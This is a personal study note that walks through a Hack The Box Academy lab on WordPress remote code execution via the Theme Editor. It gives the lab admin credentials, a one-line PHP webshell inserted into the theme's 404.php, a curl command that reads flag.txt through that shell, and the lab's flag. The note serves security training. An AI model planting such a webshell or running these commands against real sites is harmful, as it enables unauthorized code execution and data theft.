Project:: HTB
Type:: CBBH
Progress:: Completed
Tags:: #ThemeEditor 
Sites:: [HTB Academy](https://academy.hackthebox.com/module/17/section/60)
BackLinks:: [[WordPress]], [[RCE]]
OS related:: 
Walkthrough:: 
Note:: I can't use `php-reverse-shell.php` like THM's Internal (Can search in Obsidian. I don't want to tag something that can't be used)

---
## Use the <mark style="background: #FFB86CA6;">credentials</mark> for the admin user <mark style="background: #FFB86CA6;">[admin:sunshine1]</mark> and <mark style="background: #FFB86CA6;">upload a webshell</mark> to your target. Once you have access to the target, obtain the contents of the <mark style="background: #FF5582A6;">"flag.txt"</mark> file in the <mark style="background: #FFB86CA6;">home directory</mark> for the <mark style="background: #FFB86CA6;">"wp-user"</mark> directory.
- `HTB{rc3_By_d3s1gn}`
	- access `wp-admin`
	- edit `404.php` using #ThemeEditor (use doc)
		```php hl:1
		system($_GET['cmd']);
		```
		- ![[Pasted image 20231228025600.png]]
	- Get flag
		```txt hl:2 ans:3
		╭─ /mn/H/No/CyberVault/Hac/A/B/Hacking Wordpess/3_Exploitation/13_RCE via the Theme Editor ········ ✔  13:53:41
		╰─ curl -X GET "http://$ip:$port/wp-content/themes/twentyseventeen/404.php?cmd=cat%20/home/wp-user/flag.txt"
		HTB{rc3_By_d3s1gn}
		```

